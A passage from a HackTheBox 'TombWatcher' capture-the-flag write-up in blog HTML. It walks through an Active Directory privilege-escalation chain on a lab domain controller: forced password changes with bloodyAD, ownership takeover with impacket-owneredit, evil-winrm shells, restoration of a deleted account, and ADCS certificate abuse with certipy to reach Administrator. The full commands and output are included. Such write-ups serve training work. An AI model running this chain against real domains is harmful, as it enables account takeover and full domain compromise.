+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u <span class="string">&#x27;ansible_dev$&#x27;</span> -p :1c37d00093dc2a5f25176bf2d474afdc <span class="built_in">set</span> password <span class="string">&#x27;SAM&#x27;</span> <span class="string">&#x27;kujenPassword123&#x27;</span></span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="WriteOwner-on-JOHN"><a href="#WriteOwner-on-JOHN" class="headerlink" title="WriteOwner on JOHN"></a>WriteOwner on JOHN</h3><p>SAM user can now change who the owner of JOHN user is:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TombWatcher/writeowner.png"
+                      alt="WriteOwner"
+                ><figcaption>WriteOwner</figcaption></figure></p>
+<p>We abuse this and get the user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ impacket-owneredit -action write -target <span class="string">&#x27;john&#x27;</span> -new-owner <span class="string">&#x27;sam&#x27;</span> <span class="string">&#x27;tombwatcher.htb/sam&#x27;</span>:<span class="string">&#x27;kujenPassword123&#x27;</span> -dc-ip 10.10.11.72</span><br><span class="line">Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Current owner information below</span><br><span class="line">[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512</span><br><span class="line">[*] - sAMAccountName: Domain Admins</span><br><span class="line">[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb</span><br><span class="line">[*] OwnerSid modified successfully!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u SAM -p <span class="string">&#x27;kujenPassword123&#x27;</span> add genericAll JOHN <span class="string">&#x27;SAM&#x27;</span></span><br><span class="line">[+] SAM has now GenericAll on JOHN</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u SAM -p <span class="string">&#x27;kujenPassword123&#x27;</span> <span class="built_in">set</span> password JOHN <span class="string">&#x27;kujenPassword123&#x27;</span></span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(kali㉿kali)-[~/gMSADumper]</span><br><span class="line">└─$ evil-winrm -i dc01.tombwatcher.htb -u john -p <span class="string">&#x27;kujenPassword123&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\john\Documents&gt; <span class="built_in">cat</span> ../desktop/user.txt</span><br><span class="line">2849b114cb5c9d6ab7bc670a587b71eb</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="ADCS-abuse-to-administrator"><a href="#ADCS-abuse-to-administrator" class="headerlink" title="ADCS abuse to administrator"></a>ADCS abuse to administrator</h3><p>Checking the certificate templates with certipy, we can see that user with rid 1111 has Enrollment Rights&#x2F;Write Property Enroll on the WebServer template, we can also find that user on the deleted user list:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\john\Documents&gt; Get-ADObject -Filter <span class="string">&#x27;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#x27;</span> -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name            : cert_admin_temp2</span><br><span class="line">                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span><br><span class="line">ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span><br><span class="line">objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111</span><br><span class="line">lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\john\Documents&gt; Restore-ADObject -Identity <span class="string">&#x27;938182c3-bf0b-410a-9aaa-45c8e1a02eb</span></span><br></pre></td></tr></table></figure></div>
+
+<p>First lets change the password of cert_admin user then request a certificate for administrator:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Certipy]</span><br><span class="line">└─$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u JOHN -p <span class="string">&#x27;kujenPassword123&#x27;</span> <span class="built_in">set</span> password cert_admin <span class="string">&#x27;kujenPassword123&#x27;</span></span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[~/Certipy]</span><br><span class="line">└─$ certipy req -u <span class="string">&#x27;cert_admin@tombwatcher.htb&#x27;</span> -p <span class="string">&#x27;kujenPassword123&#x27;</span> -target dc01.tombwatcher.htb -ca <span class="string">&#x27;tombwatcher-CA-1&#x27;</span> -template <span class="string">&#x27;WebServer&#x27;</span> -upn <span class="string">&#x27;Administrator&#x27;</span> -application-policies <span class="string">&#x27;Client Authentication&#x27;</span></span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[!] DNS resolution failed: The DNS query name does not exist: TOMBWATCHER.HTB.</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 3</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Try using -sid to <span class="built_in">set</span> the object SID or see the wiki <span class="keyword">for</span> more details</span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line">                                                                                         </span><br></pre></td></tr></table></figure></div>
+<p>now we authenticate with the cert and get our Administrator access:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Certipy]</span><br><span class="line">└─$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell</span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;Administrator&#x27;</span></span><br><span class="line">[*] Connecting to <span class="string">&#x27;ldaps://10.10.11.72:636&#x27;</span></span><br><span class="line">[*] Authenticated to <span class="string">&#x27;10.10.11.72&#x27;</span> as: <span class="string">&#x27;u:TOMBWATCHER\\Administrator&#x27;</span></span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># change_password kujenPassword123 </span></span><br><span class="line">can only concatenate str (not <span class="string">&quot;NoneType&quot;</span>) to str</span><br><span class="line"></span><br><span class="line"><span class="comment"># change_password Administrator kujenPassword123 </span></span><br><span class="line">Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb</span><br><span class="line">Attempting to <span class="built_in">set</span> new password of: kujenPassword123</span><br><span class="line">Password changed successfully!</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">Bye!</span><br><span class="line">                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/Certipy]</span><br><span class="line">└─$ evil-winrm -u administrator -i  10.10.11.72  -p <span class="string">&#x27;kujenPassword123&#x27;</span>              </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                           </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                             </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../desktop/root.txt</span><br><span class="line">cbda335dca1be32fb74a7e97ffb93519</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for TombWatcher, hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: TombWatcher</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-10-11 12:22:48</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-11 12:41:32
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/10/11/Hackthebox-TombWatcher/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/10/04/Hackthebox-Certificate/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Certificate</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: TombWatcher</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WriteSPN-abuse"><span class="nav-text">WriteSPN abuse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AddSelf-to-INFRASTRUCTURE-group"><span class="nav-text">AddSelf to INFRASTRUCTURE group</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ReadGMSAPassword-of-ANSIBLE-DEVS"><span class="nav-text">ReadGMSAPassword of ANSIBLE_DEVS$</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ForceChangePassword-for-SAM"><span class="nav-text">ForceChangePassword for SAM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WriteOwner-on-JOHN"><span class="nav-text">WriteOwner on JOHN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ADCS-abuse-to-administrator"><span class="nav-text">ADCS abuse to administrator</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
